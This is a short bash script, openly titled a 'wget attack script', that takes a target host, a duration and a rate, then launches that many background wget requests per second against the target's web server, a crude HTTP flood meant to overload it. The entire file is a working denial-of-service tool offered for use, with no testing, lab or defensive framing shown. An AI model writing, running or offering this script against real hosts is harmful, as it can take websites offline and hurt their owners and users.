#!/bin/bash
# Simple wget attack script
# Usage: ./script.sh target.com 30 70

target=$1
duration=$2
rate=$3

echo "Sending $rate wget requests/second to $target for $duration seconds..."

for ((sec=0; sec<duration; sec++)); do
    for ((i=0; i<rate; i++)); do
        wget -q -O /dev/null "http://$target" &
    done
    sleep 1
done

wait
echo "Attack completed"